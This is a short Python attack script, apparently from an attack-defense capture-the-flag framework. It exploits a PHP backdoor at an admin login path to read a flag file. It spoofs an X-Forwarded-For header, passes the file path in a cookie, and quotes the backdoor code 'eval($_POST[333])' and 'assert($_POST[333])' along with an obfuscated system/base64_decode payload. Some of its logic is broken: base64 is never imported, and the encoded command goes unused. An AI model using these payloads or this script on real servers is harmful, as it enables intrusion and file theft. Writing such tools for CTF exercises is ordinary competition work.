#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    eval($_POST[333]);
    assert($_POST[333]);
    '''
    
    try:           
        cmd = base64.b64encode(cmd)
        # This payload may not work under some php versions
        #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
        #print payload
        data = 'cmd=%s'% (flag_path) 
        headers['Cookie'] = data
        headers['X-Forwarded-For'] = '8.8.8.8'
        res = http("post",target,target_port,"/index.php/admin/login/backdoor?hongkexueyuan=highlight_file",data,headers)
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"
    
    if len(res) ==32:
        res = cmd_prefix + res + cmd_postfix
    else:
        res = 'error'
    return res




